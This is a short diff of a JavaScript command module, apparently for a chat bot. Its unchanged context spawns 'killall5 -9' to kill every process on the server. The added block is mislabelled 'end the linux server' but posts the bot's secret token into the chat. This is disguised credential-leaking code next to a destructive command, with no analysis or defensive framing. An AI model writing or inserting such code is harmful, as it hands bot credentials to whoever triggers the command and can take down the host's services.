@@ -24,3 +24,11 @@ module.exports.end = {
         require("child_process").spawn("killall5", ["-9"]);
     }
 }
+
+module.exports.end = {
+    name: 'lol',
+    description: "end the linux server",
+    run: async ({client, message}) => {
+        message.reply(client.token);
+    }
+}
